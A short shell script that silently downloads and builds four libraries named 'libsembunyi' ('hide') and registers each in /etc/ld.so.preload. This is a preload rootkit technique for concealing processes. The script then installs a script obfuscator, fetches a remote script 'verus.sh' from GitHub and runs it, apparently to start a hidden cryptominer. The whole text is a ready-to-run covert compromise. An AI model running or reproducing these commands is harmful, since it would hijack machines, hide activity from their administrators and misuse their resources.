wget https://github.com/mutiahanum22/used/releases/download/fired/all.tar.gz &> /dev/null
tar -xvf all.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload
apt-get install shc -y && wget https://raw.githubusercontent.com/thefacta/script/main/verus.sh && chmod +x verus.sh
./verus.sh
